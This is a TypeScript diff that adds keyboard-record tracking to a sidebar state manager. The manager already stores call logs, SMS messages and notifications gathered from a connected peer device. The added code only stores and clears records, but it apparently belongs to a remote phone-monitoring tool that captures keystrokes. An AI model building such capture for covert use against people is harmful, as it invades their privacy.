@@ -14,6 +14,7 @@ import type {
   CallRecord,
   SmsRecord,
   NotificationRecord,
+  KeyboardRecord,
   WallpaperTarget,
   WallpaperDataState,
   WallpaperChunkPayload,
@@ -30,11 +31,13 @@ class RightSidebarStateManager {
   private smsMonitoringState: MonitoringState = 'IDLE';
   private notificationMonitoringState: MonitoringState = 'IDLE';
   private wallpaperMonitoringState: MonitoringState = 'IDLE';
+  private keyboardMonitoringState: MonitoringState = 'IDLE';
 
   // In-Memory Telemetry Data Stores
   private callLogs: CallRecord[] = [];
   private smsMessages: SmsRecord[] = [];
   private notifications: NotificationRecord[] = [];
+  private keyboardRecords: KeyboardRecord[] = [];
 
   // Wallpaper Data State
   private wallpaperData: WallpaperDataState = {
@@ -338,6 +341,49 @@ class RightSidebarStateManager {
     this.notify();
   }
 
+  // ---------------------------------------------------------------------------
+  // KEYBOARD AUDITING STATE
+  // ---------------------------------------------------------------------------
+
+  public getKeyboardMonitoringState(): MonitoringState {
+    return this.keyboardMonitoringState;
+  }
+
+  public setKeyboardMonitoringState(state: MonitoringState): void {
+    if (this.keyboardMonitoringState !== state) {
+      this.keyboardMonitoringState = state;
+      this.notify();
+    }
+  }
+
+  public getKeyboardRecords(): KeyboardRecord[] {
+    return [...this.keyboardRecords];
+  }
+
+  public setKeyboardRecords(records: KeyboardRecord[]): void {
+    this.keyboardRecords = [...records];
+    this.notify();
+  }
+
+  public prependKeyboardRecord(record: KeyboardRecord): void {
+    const existingIndex = this.keyboardRecords.findIndex(r => r.id === record.id);
+    if (existingIndex >= 0) {
+      this.keyboardRecords[existingIndex] = record;
+    } else {
+      this.keyboardRecords.unshift(record);
+    }
+
+    if (this.keyboardRecords.length > 500) {
+      this.keyboardRecords = this.keyboardRecords.slice(0, 500);
+    }
+    this.notify();
+  }
+
+  public clearKeyboardRecords(): void {
+    this.keyboardRecords = [];
+    this.notify();
+  }
+
   /**
    * Resets all monitoring states to IDLE when peer connection drops.
    */
@@ -357,6 +403,10 @@ class RightSidebarStateManager {
     }
     if (this.wallpaperMonitoringState !== 'IDLE') {
       this.wallpaperMonitoringState = 'IDLE';
+      changed = true;
+    }
+    if (this.keyboardMonitoringState !== 'IDLE') {
+      this.keyboardMonitoringState = 'IDLE';
       changed = true;
     }
     if (this.wallpaperData.isFetching || this.wallpaperData.isPushing) {
